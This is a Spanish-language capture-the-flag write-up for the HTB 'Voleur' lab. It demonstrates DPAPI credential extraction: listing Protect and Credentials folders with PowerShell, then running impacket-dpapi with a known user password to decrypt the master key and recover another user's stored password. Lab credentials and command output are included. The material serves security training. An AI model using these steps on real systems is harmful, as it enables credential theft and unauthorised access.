
> Data Protection API (DPAPI) es un metodo utilizado por sistemas windows para el cifrado simetrico de llaves privada asimetricas. Simplifica el cifrado para los desarrolladores permitiendoles cifrar datos utilizando una llave derivada de los secretos de inicio de sesion del usuario.

Existen varios metodos y herramientas para la extraccion y descifrado de claves dentro de DPAPI. Sin embargo, es importante considerar lo siguiente:
- La estructura de los datos cifrados se compone por **GUID (Global Unique Identifies)** y **SID (Security Identifies)**.
- **SID** corresponde al identificador del usuario que cifro los datos.
- **GUID** corresponde a la llave maestra que fue utilizada para el cifrado de datos.
- Combinando **SID** y **GUID** obtenemos la ruta de la llave maestra:
	- C:\PATH\TO\MASTER\KEY\\**{SID}**\\**{GUID}** 

>Fuentes
>[infosecwriteups](https://infosecwriteups.com/decrypting-dpapi-credentials-offline-8c8f27207956)
>[Credential Hunting DPAPI](https://htb.linuxsec.org/active-directory/credential-hunting/dpapi)
>[TLDR bins](https://tldrbins.github.io/dpapi/)

>Escenario  
>Consideraremos el escenario de la maquina voleur de HTB. En esta maquina/escenario ya contamos con las credenciales **todd.wolfe:NightT1meP1dg3on14**. Obtendremos credenciales del usuario **jeremy.combs** por medio de credenciales almacenadas en DPAPI.

>Enumeracion de credenciales DPAPI.

Archivos protegidos se encuentran usualmente ubicados en:
- C:\Users\username\AppData\Roaming\Microsoft\Protect\*
- C:\Users\username\AppData\Roaming\Microsoft\Credentials\*
- C:\Users\username\AppData\Roaming\Microsoft\Vault\*
- Tambien es cambia `\Roaming\` por `\Local\` en las rutas mostradas.

*Nota: Es posible enumerar con los comando **dir /A C:\PATH** y **Get-ChildItem  -Force**.*

Comenzaremos con la enumeracion.
1) Utilizando powershell listamos el contenido de la ruta **\Microsoft**.

```powershell
PS:> Get-ChildItem -Force C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\

# Salida
# Mode                 LastWriteTime         Length Name             
# ----                 -------------         ------ ----             
#d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       
#-a-hs-         1/29/2025   4:53 AM             24 CREDHIST          
#-a-hs-         1/29/2025   4:53 AM             76 SYNCHIST  
```

**S-1-5-21-3927696377-1337352550-2781715495-1110** corresponde al **SID** del usuario **todd.wolfe**.

2) Utilizando el mismo metodo, listamos el contenido del **SID** previamente obtenido.

```powershell
PS:> Get-ChildItem -Force C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\

# Salida 
# Mode                 LastWriteTime         Length Name             
# ----                 -------------         ------ ----             
#-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88 
```

**08949382-134f-4c63-b93c-ce52efc0aa88** corresponde al **GUID** de la llave maestra. Es necesario descargar el archivo **08949382-134f-4c63-b93c-ce52efc0aa88** a nuestra maquina atacante

3) Para finalizar, enumeraremos el contenido del directorio **\Credentials**, en busca del 

```powershell
PS:> Get-ChildItem -Force C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\

# Salida
# Mode                 LastWriteTime         Length Name             
# ----                 -------------         ------ ----             
# -a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3 
```

**772275FAD58525253490A9B0039791D3** corresponde al archivo que contiene las credenciales almacenadas y cifradas. Tambien es necesario descargarlo en nuestra maquina atacante.

Llegando a este punto, ya es posible que descifremos los archivos y obtengamos credenciales en texto claro.

>Descifrando contrasenas con  impacket-dpapi

*Nota: En caso de optar por obtener el valor Base64 de los archivos y decifrarlos en nuestra maquina loca, tener en cuenta que en ocasiones no funciona este metodo.*

1) Descifrando **masterkey**.

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid "S-1-5-21-3927696377-1337352550-2781715495-1110" -password "NightT1meP1dg3on14"

# Salida Esperada

#Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

# [MASTERKEYFILE]
# Version     :        2 (2)
# Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
# <SNIP>

# Decrypted key with User Key (MD4 protected)
# Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

2) Obtener credentiales.

```bash
impacket-dpapi credential -f "772275FAD58525253490A9B0039791D3" -key "0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83"

# Salida Esperada.
#[CREDENTIAL]
# <SNIP>
# Username    : jeremy.combs
# Unknown     : qT3V9pLXyN7W4m
```



